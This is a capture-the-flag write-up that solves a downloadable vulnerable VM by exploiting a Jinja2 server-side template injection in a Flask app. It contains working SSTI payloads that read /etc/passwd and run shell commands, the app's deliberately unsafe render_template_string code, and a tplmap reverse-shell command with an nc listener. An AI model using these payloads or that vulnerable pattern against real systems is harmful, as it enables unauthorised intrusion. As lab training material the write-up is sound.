# Challenge Name: Thehackernewsbdarija

![date](https://img.shields.io/badge/date-19.12.2021-brightgreen.svg)  
![solved](https://img.shields.io/badge/solved-in%20time-brightgreen.svg)   
![category](https://img.shields.io/badge/category-Boot%20to%20Root-blueviolet.svg)   



## Description

Vulnerable machine made by Th3HackerNewsBdarija

Description [Moroccan Darija] : https://www.facebook.com/Th3HackerNewsBdarija/posts/219555037030078

Description [English] : To do

https://www.facebook.com/Th3HackerNewsBdarija

https://discord.com/invite/hYrGCXMRCQ

Download link : https://drive.google.com/file/d/1ipYcoAsZ-uTrSpFcu4s0oo0OmBKqHwgk/view?usp=sharing

## Detailed solution 

Starting by importing the machine to virtualbox

We need to find the ip for the machine, you can use nmap, netdiscover, dhcp page in your router

Let's scan the machine using Nmap

```bash
nmap -sC -sV -p- 192.168.1.109 -o box.log
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-18 20:29 UTC
Nmap scan report for 192.168.1.109
Host is up (0.00040s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 01:a3:09:2d:6e:91:46:12:db:e5:de:58:d6:e9:50:c5 (RSA)
|   256 11:48:e7:5c:60:fe:f1:45:ea:87:e7:84:9c:89:d9:cb (ECDSA)
|_  256 44:1b:b9:a4:44:50:64:90:81:38:94:43:4c:c3:65:97 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.24 seconds
```
As we can see we have an OpenSSH 7.6p1 running on port 22 and a web application running on port 80 with the web server Apache httpd 2.4.29  

From banner we can see that the OS is Ubuntu  

### Web application

Openning the web application http://192.168.1.106/  

![image](https://user-images.githubusercontent.com/72421091/146686576-a7569cef-6d59-46b0-b858-c0fc63078aa2.png)

view-source:http://192.168.1.106/

```html

<html>
	<head></head>
	<title></title>

<style>
@import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');

* {
    padding: 0;
    margin: 0;
    box-sizing: border-box;
    font-family: 'Press Start 2P';
    color: #FFFFFF;
    text-align: center;
}

body {
    background-color: #000000;
    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='42' height='58' viewBox='0 0 42 58'%3E%3Cg fill='%23dddcdd' fill-opacity='0.23'%3E%3Cpath fill-rule='evenodd' d='M12 18h12v18h6v4H18V22h-6v-4zm-6-2v-4H0V0h36v6h6v36h-6v4h6v12H6v-6H0V16h6zM34 2H2v8h24v24h8V2zM6 8a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm8 0a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm8 0a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm8 0a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm0 8a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm0 8a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm0 8a2 2 0 1 0 0-4 2 2 0 0 0 0 4zM2 50h32v-8H10V18H2v32zm28-6a2 2 0 1 0 0 4 2 2 0 0 0 0-4zm-8 0a2 2 0 1 0 0 4 2 2 0 0 0 0-4zm-8 0a2 2 0 1 0 0 4 2 2 0 0 0 0-4zm-8 0a2 2 0 1 0 0 4 2 2 0 0 0 0-4zm0-8a2 2 0 1 0 0 4 2 2 0 0 0 0-4zm0-8a2 2 0 1 0 0 4 2 2 0 0 0 0-4zm0-8a2 2 0 1 0 0 4 2 2 0 0 0 0-4z'/%3E%3C/g%3E%3C/svg%3E");
}

section.notFound {
    display: flex;
    justify-content: center;
    align-items: center;
    margin: 0 5%;
    height: 100vh;
}

section.notFound h1 {
    color: red;
    font-size: 100px;
}

section.notFound h2 {
    font-size: 50px;
}

section.notFound h1, h2, h3 {
    margin-bottom: 40px;
}

div.text {
    height: 50vh;
}

div.text a {
    text-decoration: none;
    margin-right: 20px;
}

div.text a:hover {
    color: red;
    text-decoration: underline;
}

@media only screen and (max-width: 768px) {
    section.notFound {
        flex-direction: column;
        justify-content: space-around;
    }
    section.notFound div.img img {
        width: 70vw;
        height: auto;
    }
    section.notFound h1 {
        font-size: 50px;
    }
    section.notFound h2 {
        font-size: 25px;
    }
    div.text a:active {
    color: red;
    text-decoration: underline;
  }
}</style>
	<body>
    <section class="notFound">
        <div class="img">
		<h2>TH3 HACKER NEWS B'DARIJA</h2>
		<img src="https://cdn.dribbble.com/users/2686403/screenshots/6472886/image.gif" />

<embed src="../trap.mp3" loop="true" autostart="true" width="2"
         height="0">

	</div>
	
    </section>
</body>
</html>
```

The page has only a external gif image, mp3 file and some css

- The gif image is from a person **ABEL B** : https://dribbble.com/shots/6472886-Transgalatic-Cab 
- mp3 file is not found

```bash
┌──(kali㉿kali)-[~]
└─$ whatweb http://192.168.1.106
http://192.168.1.106 [200 OK] Adobe-Flash, Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[192.168.1.106]
```

We have no clue about the web application, let's start with some directory brutforcing 

- I searched for some communs extentions and use gobuster to find directories and files i found onlt the http://192.168.1.106/server-status shwoing 403  

I tried to search for some parametres using wfuzz  

https://gist.github.com/nullenc0de/9cb36260207924f8e1787279a05eb773

```bash
┌──(kali㉿kali)-[~]
└─$ wfuzz -c -z file,params.txt --hh 2347 -t 30 http192.168.1.106FUZZ=a                               130 ⨯
 usrlibpython3dist-packageswfuzz__init__.py34 UserWarningPycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

 Wfuzz 3.1.0 - The Web Fuzzer                         


Target http192.168.1.106FUZZ=a
Total requests 10253

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000007639   200        0 L      1 W        1 Ch        search

Total time 0
Processed Requests 10253
Filtered Requests 10252
Requestssec. 0
```

As we can see we found the parametre **search** let's interace with it

http://192.168.1.106/?search=11111111
- It's always show the same input in the results
- trying some sql injection, xss, php code without success
- Trying with some template injection we were able to have a differnent output

http://192.168.1.106/?search={{1*1}}   --> 1  

So probably we have an SSTI let's do some enumeration  

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2

![image](https://user-images.githubusercontent.com/72421091/146686955-c9af3ed2-9174-4b88-8f00-591f468fad88.png)

So our template engine is : Twig/Jinja2/Unknown  

I started with jinja2

http://192.168.1.106/?search={{config.items()}}

```
ict_items([('ENV', 'production'), ('DEBUG', False), 
('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), 
('PRESERVE_CONTEXT_ON_EXCEPTION', None), 
('SECRET_KEY', None),
 ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(31)), 
('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), 
('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', None), 
('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), 
('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), 
('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), 
('SEND_FILE_MAX_AGE_DEFAULT', None), ('TRAP_BAD_REQUEST_ERRORS', None), 
('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), 
('PREFERRED_URL_SCHEME', 'http'), ('JSON_AS_ASCII', True), 
('JSON_SORT_KEYS', True), ('JSONIFY_PRETTYPRINT_REGULAR', False),
('JSONIFY_MIMETYPE', 'application/json'), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093)])
 ```
 
 As we can see the got the ouput which mean that the template is jinja2
 
 Jinja2 is used by Python Web Frameworks such as Django or Flask  
 
 You can different payload at : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2  
 
 I started by trying to read files  
 
 http://192.168.1.106/?search={{%20get_flashed_messages.__globals__.__builtins__.open(%22/etc/passwd%22).read()%20}}
 
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
c3p0:x:1002:1002:c3p0d4y,,,:/home/c3p0:/bin/bash
```

Executing commands  


view-source:http://192.168.1.106/?search={{config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20-la%27).read()}}

```
total 96
drwxr-xr-x  25 root root  4096 Dec 19 14:37 .
drwxr-xr-x  25 root root  4096 Dec 19 14:37 ..
drwxr-xr-x   2 root root  4096 Dec  8 16:04 bin
drwxr-xr-x   3 root root  4096 Dec  8 16:03 boot
drwxr-xr-x   2 root root  4096 Dec 17 11:19 data
drwxr-xr-x  16 root root  3660 Dec 19 14:37 dev
drwxr-xr-x  92 root root  4096 Dec 18 20:23 etc
drwxr-xr-x   3 root root  4096 Dec 17 12:34 home
lrwxrwxrwx   1 root root    34 Dec  8 16:02 initrd.img -&gt; boot/initrd.img-4.15.0-163-generic
lrwxrwxrwx   1 root root    34 Dec  8 16:02 initrd.img.old -&gt; boot/initrd.img-4.15.0-163-generic
drwxr-xr-x  21 root root  4096 Dec 17 11:27 lib
drwxr-xr-x   2 root root  4096 Dec  8 15:56 lib64
drwx------   2 root root 16384 Dec  8 16:05 lost+found
drwxr-xr-x   2 root root  4096 Dec  8 15:53 media
drwxr-xr-x   2 root root  4096 Dec  8 15:53 mnt
drwxr-xr-x   2 root root  4096 Dec  8 15:53 opt
dr-xr-xr-x 120 root root     0 Dec 19 14:37 proc
drwx------   6 root root  4096 Dec 17 12:33 root
drwxr-xr-x  26 root root   880 Dec 19 17:30 run
drwxr-xr-x   2 root root  4096 Dec  8 16:48 sbin
drwxr-xr-x   2 root root  4096 Dec 17 11:19 snap
drwxr-xr-x   2 root root  4096 Dec  8 15:53 srv
dr-xr-xr-x  13 root root     0 Dec 19 15:38 sys
drwxrwxrwt   2 root root  4096 Dec 19 16:43 tmp
drwxr-xr-x  11 root root  4096 Dec  8 16:00 usr
drwxr-xr-x   2 root root  4096 Dec 17 11:19 vagrant
drwxr-xr-x  14 root root  4096 Dec 17 11:28 var
lrwxrwxrwx   1 root root    31 Dec  8 16:02 vmlinuz -&gt; boot/vmlinuz-4.15.0-163-generic
lrwxrwxrwx   1 root root    31 Dec  8 16:02 vmlinuz.old -&gt; boot/vmlinuz-4.15.0-163-generic
```

We can read also the web application files in /var/www/hackernews

```python
#!/usr/bin/python

from flask import *
import os

app = Flask(__name__)

@app.route(&#39;/&#39;)
def index():
        if request.args.get(&#39;search&#39;):
            return render_template_string(request.args.get(&#39;search&#39;))

        else:
            return render_template(&#39;index.html&#39;)
if __name__ == &#39;__main__&#39;:
    app.run()
```
I tried to get reverse shell using netcat, i got the connection but if i use -e sh or bash it's not working

I switch to a tool called tplmap https://github.com/epinna/tplmap

```bash
┌──(kali㉿kali)-[~/tplmap]
└─$ python2 tplmap.py -u "http://192.168.1.106/?search=*" --reverse-shell 192.168.1.108 4444
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if GET parameter 'search' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  GET parameter: search
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

[-][tcpserver] Port bind on 0.0.0.0:4444 has failed: [Errno 98] Address already in use
```
Intercept the resquest [Todo]

I got the reverse shell
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.1.108] from (UNKNOWN) [192.168.1.100] 48990
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
data
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
vagrant
var
vmlinuz
vmlinuz.old
```
Let's stabilize the shell ....

